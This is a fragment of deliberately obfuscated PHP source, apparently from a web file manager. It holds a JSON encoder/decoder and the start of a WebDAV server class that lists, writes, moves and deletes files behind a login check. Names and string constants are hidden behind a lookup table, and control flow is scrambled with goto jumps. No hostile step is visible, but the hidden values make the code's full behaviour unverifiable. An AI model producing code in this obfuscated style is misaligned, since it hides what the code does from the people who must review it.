$D¢Òª¡«›…[33]; } function encode($dÆÀÜ£È‡¤) { $d˜šòˆ½± =& $_SERVER[¬ˆÚÂ”Éğä]; switch (gettype($dÆÀÜ£È‡¤)) { case $d˜šòˆ½±[1614]: return $dÆÀÜ£È‡¤ ? $d˜šòˆ½±[1613] : $d˜šòˆ½±[1615]; case $d˜šòˆ½±[1956]: return $d˜šòˆ½±[99]; case $d˜šòˆ½±[303]: return (int) $dÆÀÜ£È‡¤; case $d˜šòˆ½±[278]: case $d˜šòˆ½±[277]: return (double) $dÆÀÜ£È‡¤; case $d˜šòˆ½±[312]: $bÆÒÖ×Ìâ£ = $d˜šòˆ½±[33]; $eó¶Ô‡ğ±­ = strlen($dÆÀÜ£È‡¤); for ($B‚¸²‘¿† = 0; $B‚¸²‘¿† < $eó¶Ô‡ğ±­; ++$B‚¸²‘¿†) { $D¯é‰…ŒÜ» = ord($dÆÀÜ£È‡¤[$B‚¸²‘¿†]); switch (!0) { case $D¯é‰…ŒÜ» == 8: $bÆÒÖ×Ìâ£ .= $d˜šòˆ½±[1957]; break; case $D¯é‰…ŒÜ» == 9: $bÆÒÖ×Ìâ£ .= $d˜šòˆ½±[1590]; break; case $D¯é‰…ŒÜ» == 10: $bÆÒÖ×Ìâ£ .= $d˜šòˆ½±[1588]; break; case $D¯é‰…ŒÜ» == 12: $bÆÒÖ×Ìâ£ .= $d˜šòˆ½±[1958]; break; case $D¯é‰…ŒÜ» == 13: $bÆÒÖ×Ìâ£ .= $d˜šòˆ½±[1589]; break; case $D¯é‰…ŒÜ» == 34: case $D¯é‰…ŒÜ» == 47: case $D¯é‰…ŒÜ» == 92: $bÆÒÖ×Ìâ£ .= $d˜šòˆ½±[93] . $dÆÀÜ£È‡¤[$B‚¸²‘¿†]; break; case $D¯é‰…ŒÜ» >= 32 && $D¯é‰…ŒÜ» <= 127: $bÆÒÖ×Ìâ£ .= $dÆÀÜ£È‡¤[$B‚¸²‘¿†]; break; case ($D¯é‰…ŒÜ» & 224) == 192: $f‰®»‡¢ôà = pack($d˜šòˆ½±[1959], $D¯é‰…ŒÜ», ord($dÆÀÜ£È‡¤[$B‚¸²‘¿† + 1])); $B‚¸²‘¿† += 1; $eñ¥Ü¾…¸ = $this->utf82utf16($f‰®»‡¢ôà); $bÆÒÖ×Ìâ£ .= sprintf($d˜šòˆ½±[1960], bin2hex($eñ¥Ü¾…¸)); break; case ($D¯é‰…ŒÜ» & 240) == 224: $f‰®»‡¢ôà = pack($d˜šòˆ½±[1959], $D¯é‰…ŒÜ», ord($dÆÀÜ£È‡¤[$B‚¸²‘¿† + 1]), ord($dÆÀÜ£È‡¤[$B‚¸²‘¿† + 2])); $B‚¸²‘¿† += 2; $eñ¥Ü¾…¸ = $this->utf82utf16($f‰®»‡¢ôà); $bÆÒÖ×Ìâ£ .= sprintf($d˜šòˆ½±[1960], bin2hex($eñ¥Ü¾…¸)); break; case ($D¯é‰…ŒÜ» & 248) == 240: $f‰®»‡¢ôà = pack($d˜šòˆ½±[1959], $D¯é‰…ŒÜ», ord($dÆÀÜ£È‡¤[$B‚¸²‘¿† + 1]), ord($dÆÀÜ£È‡¤[$B‚¸²‘¿† + 2]), ord($dÆÀÜ£È‡¤[$B‚¸²‘¿† + 3])); $B‚¸²‘¿† += 3; $eñ¥Ü¾…¸ = $this->utf82utf16($f‰®»‡¢ôà); $bÆÒÖ×Ìâ£ .= sprintf($d˜šòˆ½±[1960], bin2hex($eñ¥Ü¾…¸)); break; case ($D¯é‰…ŒÜ» & 252) == 248: $f‰®»‡¢ôà = pack($d˜šòˆ½±[1959], $D¯é‰…ŒÜ», ord($dÆÀÜ£È‡¤[$B‚¸²‘¿† + 1]), ord($dÆÀÜ£È‡¤[$B‚¸²‘¿† + 2]), ord($dÆÀÜ£È‡¤[$B‚¸²‘¿† + 3]), ord($dÆÀÜ£È‡¤[$B‚¸²‘¿† + 4])); $B‚¸²‘¿† += 4; $eñ¥Ü¾…¸ = $this->utf82utf16($f‰®»‡¢ôà); $bÆÒÖ×Ìâ£ .= sprintf($d˜šòˆ½±[1960], bin2hex($eñ¥Ü¾…¸)); break; case ($D¯é‰…ŒÜ» & 254) == 252: $f‰®»‡¢ôà = pack($d˜šòˆ½±[1959], $D¯é‰…ŒÜ», ord($dÆÀÜ£È‡¤[$B‚¸²‘¿† + 1]), ord($dÆÀÜ£È‡¤[$B‚¸²‘¿† + 2]), ord($dÆÀÜ£È‡¤[$B‚¸²‘¿† + 3]), ord($dÆÀÜ£È‡¤[$B‚¸²‘¿† + 4]), ord($dÆÀÜ£È‡¤[$B‚¸²‘¿† + 5])); $B‚¸²‘¿† += 5; $eñ¥Ü¾…¸ = $this->utf82utf16($f‰®»‡¢ôà); $bÆÒÖ×Ìâ£ .= sprintf($d˜šòˆ½±[1960], bin2hex($eñ¥Ü¾…¸)); break; } } return $d˜šòˆ½±[113] . $bÆÒÖ×Ìâ£ . $d˜šòˆ½±[113]; case $d˜šòˆ½±[1961]: if (is_array($dÆÀÜ£È‡¤) && count($dÆÀÜ£È‡¤) && array_keys($dÆÀÜ£È‡¤) !== range(0, sizeof($dÆÀÜ£È‡¤) - 1)) { $Bİô–¿ÄÉ = array_map(array($this, $d˜šòˆ½±[1962]), array_keys($dÆÀÜ£È‡¤), array_values($dÆÀÜ£È‡¤)); foreach ($Bİô–¿ÄÉ as $bÆ·ùÚ‚³) { if (Services_JSON::isError($bÆ·ùÚ‚³)) { return $bÆ·ùÚ‚³; } } return $d˜šòˆ½±[1081] . join($d˜šòˆ½±[47], $Bİô–¿ÄÉ) . $d˜šòˆ½±[315]; } $BÓÁ‘âï× = array_map(array($this, $d˜šòˆ½±[1963]), $dÆÀÜ£È‡¤); foreach ($BÓÁ‘âï× as $a±“Øù®æ£) { if (Services_JSON::isError($a±“Øù®æ£)) { return $a±“Øù®æ£; } } return $d˜šòˆ½±[157] . join($d˜šòˆ½±[47], $BÓÁ‘âï×) . $d˜šòˆ½±[478]; case $d˜šòˆ½±[1964]: $aæ«ìäŸ³£ = get_object_vars($dÆÀÜ£È‡¤); $Bİô–¿ÄÉ = array_map(array($this, $d˜šòˆ½±[1962]), array_keys($aæ«ìäŸ³£), array_values($aæ«ìäŸ³£)); foreach ($Bİô–¿ÄÉ as $bÆ·ùÚ‚³) { if (Services_JSON::isError($bÆ·ùÚ‚³)) { return $bÆ·ùÚ‚³; } } return $d˜šòˆ½±[1081] . join($d˜šòˆ½±[47], $Bİô–¿ÄÉ) . $d˜šòˆ½±[315]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $d˜šòˆ½±[99] : new Services_JSON_Error(gettype($dÆÀÜ£È‡¤) . $d˜šòˆ½±[1965]); } } function name_value($cçß´¨Ìë¨, $e‘ÑÏã–±š) { $E‘…àÚìË— = $this->encode($e‘ÑÏã–±š); if (Services_JSON::isError($E‘…àÚìË—)) { return $E‘…àÚìË—; } return $this->encode(strval($cçß´¨Ìë¨)) . $_SERVER[¬ˆÚÂ”Éğä][4] . $E‘…àÚìË—; } function reduce_string($b˜îŠÅ¯ˆ‰) { $BåÑŞÊœï¡ =& $_SERVER[¬ˆÚÂ”Éğä]; $b˜îŠÅ¯ˆ‰ = preg_replace(array($BåÑŞÊœï¡[1966], $BåÑŞÊœï¡[1967], $BåÑŞÊœï¡[1968]), $BåÑŞÊœï¡[33], $b˜îŠÅ¯ˆ‰); return trim($b˜îŠÅ¯ˆ‰); } function decode($E†ÒÜáë˜å) { $B™½áóÉ¹  =& $_SERVER[¬ˆÚÂ”Éğä]; $E†ÒÜáë˜å = $this->reduce_string($E†ÒÜáë˜å); switch (strtolower($E†ÒÜáë˜å)) { case $B™½áóÉ¹ [1613]: return !0; case $B™½áóÉ¹ [1615]: return !1; case $B™½áóÉ¹ [99]: return null; default: $fğ‘±ƒ—Ô¼ = array(); if (is_numeric($E†ÒÜáë˜å)) { return (double) $E†ÒÜáë˜å == (int) $E†ÒÜáë˜å ? (int) $E†ÒÜáë˜å : (double) $E†ÒÜáë˜å; } elseif (preg_match($B™½áóÉ¹ [1969], $E†ÒÜáë˜å, $fğ‘±ƒ—Ô¼) && $fğ‘±ƒ—Ô¼[1] == $fğ‘±ƒ—Ô¼[2]) { $aÆéŞåÀ¯ö = substr($E†ÒÜáë˜å, 0, 1); $b¶äÌÅ Ò = substr($E†ÒÜáë˜å, 1, -1); $FÕ¨ä…¼«Î = $B™½áóÉ¹ [33]; $CôŞéÕš¨ª = strlen($b¶äÌÅ Ò); for ($a¸Ğğà”ê† = 0; $a¸Ğğà”ê† < $CôŞéÕš¨ª; ++$a¸Ğğà”ê†) { $a¸Ãø¹¯¢ = substr($b¶äÌÅ Ò, $a¸Ğğà”ê†, 2); $d‰”¼ºãæã = ord($b¶äÌÅ Ò[$a¸Ğğà”ê†]); switch (!0) { case $a¸Ãø¹¯¢ == $B™½áóÉ¹ [1957]: $FÕ¨ä…¼«Î .= chr(8); ++$a¸Ğğà”ê†; break; case $a¸Ãø¹¯¢ == $B™½áóÉ¹ [1590]: $FÕ¨ä…¼«Î .= chr(9); ++$a¸Ğğà”ê†; break; case $a¸Ãø¹¯¢ == $B™½áóÉ¹ [1588]: $FÕ¨ä…¼«Î .= chr(10); ++$a¸Ğğà”ê†; break; case $a¸Ãø¹¯¢ == $B™½áóÉ¹ [1958]: $FÕ¨ä…¼«Î .= chr(12); ++$a¸Ğğà”ê†; break; case $a¸Ãø¹¯¢ == $B™½áóÉ¹ [1589]: $FÕ¨ä…¼«Î .= chr(13); ++$a¸Ğğà”ê†; break; case $a¸Ãø¹¯¢ == $B™½áóÉ¹ [1370]: case $a¸Ãø¹¯¢ == $B™½áóÉ¹ [1970]: case $a¸Ãø¹¯¢ == $B™½áóÉ¹ [1583]: case $a¸Ãø¹¯¢ == $B™½áóÉ¹ [1585]: if ($aÆéŞåÀ¯ö == $B™½áóÉ¹ [113] && $a¸Ãø¹¯¢ != $B™½áóÉ¹ [1970] || $aÆéŞåÀ¯ö == $B™½áóÉ¹ [55] && $a¸Ãø¹¯¢ != $B™½áóÉ¹ [1370]) { $FÕ¨ä…¼«Î .= $b¶äÌÅ Ò[++$a¸Ğğà”ê†]; } break; case preg_match($B™½áóÉ¹ [1971], substr($b¶äÌÅ Ò, $a¸Ğğà”ê†, 6)): $C›ƒÊğÔ™ğ = chr(hexdec(substr($b¶äÌÅ Ò, $a¸Ğğà”ê† + 2, 2))) . chr(hexdec(substr($b¶äÌÅ Ò, $a¸Ğğà”ê† + 4, 2))); $FÕ¨ä…¼«Î .= $this->utf162utf8($C›ƒÊğÔ™ğ); $a¸Ğğà”ê† += 5; break; case $d‰”¼ºãæã >= 32 && $d‰”¼ºãæã <= 127: $FÕ¨ä…¼«Î .= $b¶äÌÅ Ò[$a¸Ğğà”ê†]; break; case ($d‰”¼ºãæã & 224) == 192: $FÕ¨ä…¼«Î .= substr($b¶äÌÅ Ò, $a¸Ğğà”ê†, 2); ++$a¸Ğğà”ê†; break; case ($d‰”¼ºãæã & 240) == 224: $FÕ¨ä…¼«Î .= substr($b¶äÌÅ Ò, $a¸Ğğà”ê†, 3); $a¸Ğğà”ê† += 2; break; case ($d‰”¼ºãæã & 248) == 240: $FÕ¨ä…¼«Î .= substr($b¶äÌÅ Ò, $a¸Ğğà”ê†, 4); $a¸Ğğà”ê† += 3; break; case ($d‰”¼ºãæã & 252) == 248: $FÕ¨ä…¼«Î .= substr($b¶äÌÅ Ò, $a¸Ğğà”ê†, 5); $a¸Ğğà”ê† += 4; break; case ($d‰”¼ºãæã & 254) == 252: $FÕ¨ä…¼«Î .= substr($b¶äÌÅ Ò, $a¸Ğğà”ê†, 6); $a¸Ğğà”ê† += 5; break; } } return $FÕ¨ä…¼«Î; } elseif (preg_match($B™½áóÉ¹ [1972], $E†ÒÜáë˜å) || preg_match($B™½áóÉ¹ [1973], $E†ÒÜáë˜å)) { goto A°ƒÀ¥¤Ô; E«Ü„Ÿ†Õ½: for ($a¸Ğğà”ê† = 0; $a¸Ğğà”ê† <= $CôŞéÕš¨ª; ++$a¸Ğğà”ê†) { $cÒ‡Ïâ²À = end($Eï¥Ä¥¥Œ); $a¸Ãø¹¯¢ = substr($b¶äÌÅ Ò, $a¸Ğğà”ê†, 2); if ($a¸Ğğà”ê† == $CôŞéÕš¨ª || $b¶äÌÅ Ò[$a¸Ğğà”ê†] == $B™½áóÉ¹ [47] && $cÒ‡Ïâ²À[$B™½áóÉ¹ [1974]] == SERVICES_JSON_SLICE) { $c¸ìÍ˜Ôã = substr($b¶äÌÅ Ò, $cÒ‡Ïâ²À[$B™½áóÉ¹ [263]], $a¸Ğğà”ê† - $cÒ‡Ïâ²À[$B™½áóÉ¹ [263]]); array_push($Eï¥Ä¥¥Œ, array($B™½áóÉ¹ [1974] => SERVICES_JSON_SLICE, $B™½áóÉ¹ [263] => $a¸Ğğà”ê† + 1, $B™½áóÉ¹ [1975] => !1)); if (reset($Eï¥Ä¥¥Œ) == SERVICES_JSON_IN_ARR) { array_push($fÙÃ¢œÕ•Î, $this->decode($c¸ìÍ˜Ôã)); } elseif (reset($Eï¥Ä¥¥Œ) == SERVICES_JSON_IN_OBJ) { $EóÆª™É· = array(); if (preg_match($B™½áóÉ¹ [1976], $c¸ìÍ˜Ôã, $EóÆª™É·)) { $DßÊÌ¨Î„í = $this->decode($EóÆª™É·[1]); $Câòœ‚ÙÚ = $this->decode($EóÆª™É·[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $e¬›Ü¿«Õ§[$DßÊÌ¨Î„í] = $Câòœ‚ÙÚ; } else { $e¬›Ü¿«Õ§->{$DßÊÌ¨Î„í} = $Câòœ‚ÙÚ; } } elseif (preg_match($B™½áóÉ¹ [1977], $c¸ìÍ˜Ôã, $EóÆª™É·)) { $DßÊÌ¨Î„í = $EóÆª™É·[1]; $Câòœ‚ÙÚ = $this->decode($EóÆª™É·[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $e¬›Ü¿«Õ§[$DßÊÌ¨Î„í] = $Câòœ‚ÙÚ; } else { $e¬›Ü¿«Õ§->{$DßÊÌ¨Î„í} = $Câòœ‚ÙÚ; } } } } elseif (($b¶äÌÅ Ò[$a¸Ğğà”ê†] == $B™½áóÉ¹ [113] || $b¶äÌÅ Ò[$a¸Ğğà”ê†] == $B™½áóÉ¹ [55]) && $cÒ‡Ïâ²À[$B™½áóÉ¹ [1974]] != SERVICES_JSON_IN_STR) { array_push($Eï¥Ä¥¥Œ, array($B™½áóÉ¹ [1974] => SERVICES_JSON_IN_STR, $B™½áóÉ¹ [263] => $a¸Ğğà”ê†, $B™½áóÉ¹ [1975] => $b¶äÌÅ Ò[$a¸Ğğà”ê†])); } elseif ($b¶äÌÅ Ò[$a¸Ğğà”ê†] == $cÒ‡Ïâ²À[$B™½áóÉ¹ [1975]] && $cÒ‡Ïâ²À[$B™½áóÉ¹ [1974]] == SERVICES_JSON_IN_STR && (strlen(substr($b¶äÌÅ Ò, 0, $a¸Ğğà”ê†)) - strlen(rtrim(substr($b¶äÌÅ Ò, 0, $a¸Ğğà”ê†), $B™½áóÉ¹ [93]))) % 2 != 1) { array_pop($Eï¥Ä¥¥Œ); } elseif ($b¶äÌÅ Ò[$a¸Ğğà”ê†] == $B™½áóÉ¹ [157] && in_array($cÒ‡Ïâ²À[$B™½áóÉ¹ [1974]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Eï¥Ä¥¥Œ, array($B™½áóÉ¹ [1974] => SERVICES_JSON_IN_ARR, $B™½áóÉ¹ [263] => $a¸Ğğà”ê†, $B™½áóÉ¹ [1975] => !1)); } elseif ($b¶äÌÅ Ò[$a¸Ğğà”ê†] == $B™½áóÉ¹ [478] && $cÒ‡Ïâ²À[$B™½áóÉ¹ [1974]] == SERVICES_JSON_IN_ARR) { array_pop($Eï¥Ä¥¥Œ); } elseif ($b¶äÌÅ Ò[$a¸Ğğà”ê†] == $B™½áóÉ¹ [1081] && in_array($cÒ‡Ïâ²À[$B™½áóÉ¹ [1974]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Eï¥Ä¥¥Œ, array($B™½áóÉ¹ [1974] => SERVICES_JSON_IN_OBJ, $B™½áóÉ¹ [263] => $a¸Ğğà”ê†, $B™½áóÉ¹ [1975] => !1)); } elseif ($b¶äÌÅ Ò[$a¸Ğğà”ê†] == $B™½áóÉ¹ [315] && $cÒ‡Ïâ²À[$B™½áóÉ¹ [1974]] == SERVICES_JSON_IN_OBJ) { array_pop($Eï¥Ä¥¥Œ); } elseif ($a¸Ãø¹¯¢ == $B™½áóÉ¹ [1978] && in_array($cÒ‡Ïâ²À[$B™½áóÉ¹ [1974]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Eï¥Ä¥¥Œ, array($B™½áóÉ¹ [1974] => SERVICES_JSON_IN_CMT, $B™½áóÉ¹ [263] => $a¸Ğğà”ê†, $B™½áóÉ¹ [1975] => !1)); $a¸Ğğà”ê†++; } elseif ($a¸Ãø¹¯¢ == $B™½áóÉ¹ [1979] && $cÒ‡Ïâ²À[$B™½áóÉ¹ [1974]] == SERVICES_JSON_IN_CMT) { array_pop($Eï¥Ä¥¥Œ); $a¸Ğğà”ê†++; for ($b—ã“’©â¶ = $cÒ‡Ïâ²À[$B™½áóÉ¹ [263]]; $b—ã“’©â¶ <= $a¸Ğğà”ê†; ++$b—ã“’©â¶) { $b¶äÌÅ Ò = substr_replace($b¶äÌÅ Ò, $B™½áóÉ¹ [50], $b—ã“’©â¶, 1); } } } if (reset($Eï¥Ä¥¥Œ) == SERVICES_JSON_IN_ARR) { return $fÙÃ¢œÕ•Î; } elseif (reset($Eï¥Ä¥¥Œ) == SERVICES_JSON_IN_OBJ) { return $e¬›Ü¿«Õ§; } goto a¥»Ü¨Íßõ; A°ƒÀ¥¤Ô: if ($E†ÒÜáë˜å[0] == $B™½áóÉ¹ [157]) { $Eï¥Ä¥¥Œ = array(SERVICES_JSON_IN_ARR); $fÙÃ¢œÕ•Î = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $Eï¥Ä¥¥Œ = array(SERVICES_JSON_IN_OBJ); $e¬›Ü¿«Õ§ = array(); } else { $Eï¥Ä¥¥Œ = array(SERVICES_JSON_IN_OBJ); $e¬›Ü¿«Õ§ = new stdClass(); } } array_push($Eï¥Ä¥¥Œ, array($B™½áóÉ¹ [1974] => SERVICES_JSON_SLICE, $B™½áóÉ¹ [263] => 0, $B™½áóÉ¹ [1975] => !1)); $b¶äÌÅ Ò = substr($E†ÒÜáë˜å, 1, -1); goto cÌåÓß®; cÌåÓß®: $b¶äÌÅ Ò = $this->reduce_string($b¶äÌÅ Ò); if ($b¶äÌÅ Ò == $B™½áóÉ¹ [33]) { if (reset($Eï¥Ä¥¥Œ) == SERVICES_JSON_IN_ARR) { return $fÙÃ¢œÕ•Î; } else { return $e¬›Ü¿«Õ§; } } $CôŞéÕš¨ª = strlen($b¶äÌÅ Ò); goto E«Ü„Ÿ†Õ½; a¥»Ü¨Íßõ: } } } function isError($bëÅ¶–Ğá², $EèÔ½†œö× = null) { $B»Êæ™ñÉ‘ =& $_SERVER[¬ˆÚÂ”Éğä]; if (class_exists($B»Êæ™ñÉ‘[1980])) { return PEAR::isError($bëÅ¶–Ğá², $EèÔ½†œö×); } elseif (is_object($bëÅ¶–Ğá²) && (get_class($bëÅ¶–Ğá²) == $B»Êæ™ñÉ‘[1981] || is_subclass_of($bëÅ¶–Ğá², $B»Êæ™ñÉ‘[1981]))) { return !0; } return !1; } } if (class_exists($_SERVER[¬ˆÚÂ”Éğä][1982])) { class Services_JSON_Error extends PEAR_Error { function __construct($B ‹‘©´¾ó = "\165\156\153\x6e\157\x77\x6e\40\x65\x72\162\x6f\162", $eóã¼Ñ‘ôê = null, $eŠ£ñä—¼ = null, $e²¬Ùß˜± = null, $aÏÔÃ…Á©« = null) { parent::PEAR_Error($B ‹‘©´¾ó, $eóã¼Ñ‘ôê, $eŠ£ñä—¼, $e²¬Ùß˜±, $aÏÔÃ…Á©«); } } } else { class Services_JSON_Error { function __construct($cÕ’™“ƒ– = "\x75\x6e\153\x6e\157\167\x6e\x20\x65\162\x72\x6f\162", $eÁ–×Ë°ç¦ = null, $cŸ…ØÁŞ¶ = null, $Bô­»™Ä™ = null, $cÉöÁŸß•£ = null) { } } } goto bª³ø³‘èê; BÚ‚ø×çÊÎ: class HttpDavServer { public function __construct($F¢»‹óçÕÃ, $få˜ˆ±‹) { $this->root = $F¢»‹óçÕÃ; $this->initPath($få˜ˆ±‹); $this->start(); } public function initPath($cÔÏÒÈ«ï‚) { $c¤ÅªæÄä  =& $_SERVER[¬ˆÚÂ”Éğä]; $CÖæÔó®˜Î = rtrim($_SERVER[$c¤ÅªæÄä [1401]], $c¤ÅªæÄä [8]) . $c¤ÅªæÄä [8]; $this->urlBase = substr($CÖæÔó®˜Î, 0, strpos($CÖæÔó®˜Î, $cÔÏÒÈ«ï‚) + 1); $this->urlBase = rtrim($this->urlBase, $c¤ÅªæÄä [8]) . $cÔÏÒÈ«ï‚; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $C‹‰‡»›Š£ =& $_SERVER[¬ˆÚÂ”Éğä]; $AùØ‡‰‚™ñ = HttpAuth::get(); if ($AùØ‡‰‚™ñ[$C‹‰‡»›Š£[537]] == $C‹‰‡»›Š£[1798] && $AùØ‡‰‚™ñ[$C‹‰‡»›Š£[909]] == $C‹‰‡»›Š£[1799]) { return !0; } HttpAuth::error(); } public function start() { goto c‚¶‡™“ôÃ; D¨»¯ùõŸÙ: if (!method_exists($this, $E‚Ç•Û Ó)) { pr($E‚Ç•Û Ó . $CÚš‡óí÷í[1800]); die; } $aø¬š¬ÙÇŠ = array($CÚš‡óí÷í[1801], $CÚš‡óí÷í[1802]); if (!in_array($E‚Ç•Û Ó, $aø¬š¬ÙÇŠ) && !$this->pathExists($this->path)) { $BÚÏÄ”Óé = array($CÚš‡óí÷í[1045] => 404); } else { $BÚÏÄ”Óé = $this->{$E‚Ç•Û Ó}(); } goto f•ƒÀ¸ØÇó; c‚¶‡™“ôÃ: $CÚš‡óí÷í =& $_SERVER[¬ˆÚÂ”Éğä]; $this->checkUser(); $E‚Ç•Û Ó = $CÚš‡óí÷í[144] . HttpHeader::method(); goto D¨»¯ùõŸÙ; f•ƒÀ¸ØÇó: if (!$BÚÏÄ”Óé) { return; } self::response($BÚÏÄ”Óé); goto f§‰»Ú„çë; f§‰»Ú„çë: } public function pathGet($b•¤Çå„‰¬ = false) { $eÒØà­‡™ =& $_SERVER[¬ˆÚÂ”Éğä]; $Eğ’ç£ğŒ = $b•¤Çå„‰¬ ? $_SERVER[$eÒØà­‡™[1803]] : $_SERVER[$eÒØà­‡™[1401]]; $Eğ’ç£ğŒ = KodIO::clear(rawurldecode($Eğ’ç£ğŒ)); if (!strstr($Eğ’ç£ğŒ, KodIO::clear($this->urlBase))) { return !1; } return substr($Eğ’ç£ğŒ, strpos($Eğ’ç£ğŒ, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($EÕ›õ“–Ì›) { return file_exists($EÕ›õ“–Ì›); } public function pathMkdir($bƒö“ğƒÑ) { return mkdir($bƒö“ğƒÑ, 511, !0); } public function pathInfo($Bç®¼òİé) { return path_info($Bç®¼òİé); } public function pathList($D×µÜ¿™†¶) { return path_list($D×µÜ¿™†¶); } public function pathOut($B”ó¨šÃˆ¶) { echo file_get_contents($B”ó¨šÃˆ¶); } public function pathPut($bÇòğˆï, $b„„ÔæöÉå = '') { if (!$b„„ÔæöÉå) { return file_put_contents($bÇòğˆï, $_SERVER[¬ˆÚÂ”Éğä][33]); } return move_path($b„„ÔæöÉå, $bÇòğˆï); } public function pathRemove($AŸŞ¬‹¤¸˜) { if (is_file($AŸŞ¬‹¤¸˜)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($Díğš‡¥øî, $A»†ßæ£ÕÓ) { return move_path($Díğš‡¥øî, $A»†ßæ£ÕÓ); } public function pathCopy($bÄÇáŞßªÑ, $Eµ”óñ‹×) { return copy_dir($bÄÇáŞßªÑ, $Eµ”óñ‹×); } public function parsePath($B´æ“ôÜº) { return $B´æ“ôÜº; } public function parseItem($bõ˜öŠİÃ, $AöÔàÔ«‰ê) { goto a´ñ®†÷Ç; a´ñ®†÷Ç: $F´Ø„ĞÁ‹ç =& $_SERVER[¬ˆÚÂ”Éğä]; $cŞ©¹ÚÔ—Ÿ = $this->pathGet() . $F´Ø„ĞÁ‹ç[8] . $bõ˜öŠİÃ[$F´Ø„ĞÁ‹ç[28]]; $cŞ©¹ÚÔ—Ÿ = $F´Ø„ĞÁ‹ç[8] . str_replace($F´Ø„ĞÁ‹ç[172], $F´Ø„ĞÁ‹ç[8], rawurlencode($cŞ©¹ÚÔ—Ÿ)); goto d—¡ğÊÕµ; d—¡ğÊÕµ: if ($AöÔàÔ«‰ê) { $cŞ©¹ÚÔ—Ÿ = $F´Ø„ĞÁ‹ç[8] . str_replace($F´Ø„ĞÁ‹ç[172], $F´Ø„ĞÁ‹ç[8], rawurlencode($this->pathGet())); } if (!trim($bõ˜öŠİÃ[$F´Ø„ĞÁ‹ç[107]])) { $bõ˜öŠİÃ[$F´Ø„ĞÁ‹ç[107]] = time(); } if (!trim($bõ˜öŠİÃ[$F´Ø„ĞÁ‹ç[187]])) { $bõ˜öŠİÃ[$F´Ø„ĞÁ‹ç[187]] = time(); } goto C¦åì‰ÄäŠ; C¦åì‰ÄäŠ: $FÓÔ‰­“Öª = array($F´Ø„ĞÁ‹ç[1804] => KodIO::clear($this->urlBase . $cŞ©¹ÚÔ—Ÿ), $F´Ø„ĞÁ‹ç[107] => @gmdate($F´Ø„ĞÁ‹ç[1805], $bõ˜öŠİÃ[$F´Ø„ĞÁ‹ç[107]]), $F´Ø„ĞÁ‹ç[187] => @gmdate($F´Ø„ĞÁ‹ç[1806], $bõ˜öŠİÃ[$F´Ø„ĞÁ‹ç[187]]), $F´Ø„ĞÁ‹ç[77] => $bõ˜öŠİÃ[$F´Ø„ĞÁ‹ç[77]] ? $bõ˜öŠİÃ[$F´Ø„ĞÁ‹ç[77]] : 0); return $FÓÔ‰­“Öª; goto fò¹‹ùåÁ; fò¹‹ùåÁ: } public function parseItemXml($föË…¨ÛêŸ, $e†è¢¸¤Ô‚) { $Cº¦öÍ™¦Û =& $_SERVER[¬ˆÚÂ”Éğä]; $AÊ†âåğá = $this->parseItem($föË…¨ÛêŸ, $e†è¢¸¤Ô‚); if ($föË…¨ÛêŸ[$Cº¦öÍ™¦Û[29]] == $Cº¦öÍ™¦Û[76]) { $b˜ãĞ¡¡³ù = $Cº¦öÍ™¦Û[1807]; $b˜ãĞ¡¡³ù .= $Cº¦öÍ™¦Û[1808]; } else { $d·ÕĞÖ£ƒ = $föË…¨ÛêŸ[$Cº¦öÍ™¦Û[160]] ? $föË…¨ÛêŸ[$Cº¦öÍ™¦Û[160]] : get_path_ext($föË…¨ÛêŸ[$Cº¦öÍ™¦Û[28]]); $a†ˆ÷Ñß‰‰ = get_file_mime($d·ÕĞÖ£ƒ); $b˜ãĞ¡¡³ù = $Cº¦öÍ™¦Û[1809]; $b˜ãĞ¡¡³ù .= "\74\104\x3a\x67\145\164\143\157\156\164\x65\156\x74\x74\171\x70\145\x3e{$a†ˆ÷Ñß‰‰}\74\x2f\x44\72\x67\x65\164\143\157\156\164\145\156\164\164\x79\160\x65\x3e"; } return "\12\11\x9\x3c\x44\72\x72\x65\x73\160\157\x6e\x73\x65\76\xa\x9\x9\11\74\x44\72\150\162\145\x66\x3e{$AÊ†âåğá[$Cº¦öÍ™¦Û[1804]]}\x3c\57\104\72\150\162\x65\146\76\xa\x9\x9\11\74\x44\x3a\x70\x72\x6f\160\x73\164\141\164\x3e\12\11\11\x9\x9\x3c\x44\72\x70\162\x6f\x70\76\xa\11\11\x9\11\11\74\x44\x3a\x67\x65\164\154\141\163\x74\x6d\x6f\144\151\x66\x69\145\x64\76{$AÊ†âåğá[$Cº¦öÍ™¦Û[107]]}\x3c\57\x44\x3a\x67\145\164\x6c\141\x73\x74\155\157\x64\151\x66\151\x65\144\x3e\12\11\11\11\x9\11\x3c\x44\x3a\x63\x72\x65\141\x74\151\157\156\144\141\164\145\x3e{$AÊ†âåğá[$Cº¦öÍ™¦Û[187]]}\x3c\57\104\x3a\143\x72\x65\141\164\151\x6f\156\144\141\x74\x65\x3e\12\11\x9\11\x9\11\x3c\x44\x3a\147\145\x74\143\157\x6e\x74\x65\x6e\x74\154\145\x6e\147\x74\x68\76{$AÊ†âåğá[$Cº¦öÍ™¦Û[77]]}\x3c\57\104\72\x67\145\164\x63\157\156\164\x65\156\164\154\145\156\x67\x74\x68\x3e\12\11\x9\11\x9\11{$b˜ãĞ¡¡³ù}\12\x9\11\11\x9\x3c\x2f\104\x3a\x70\x72\157\x70\x3e\12\11\11\11\x9\74\x44\72\x73\x74\141\164\x75\x73\x3e\110\x54\x54\120\57\61\x2e\61\x20\62\60\60\40\117\x4b\x3c\57\104\72\x73\164\141\x74\165\163\x3e\12\x9\11\11\74\57\104\72\x70\x72\x6f\160\x73\x74\141\x74\x3e\xa\11\x9\x3c\57\x44\x3a\x72\x65\163\x70\157\156\x73\x65\x3e"; } public function pathListMerge($D¹ƒ¯éÑ†Ã) { goto A™‹Ææ‡¨ê; e†Äêéª¿: $Bò§™Õ©” = array(); foreach ($D¹ƒ¯éÑ†Ã as $f¥šˆù°© => $fšêëÁ¦öÃ) { if 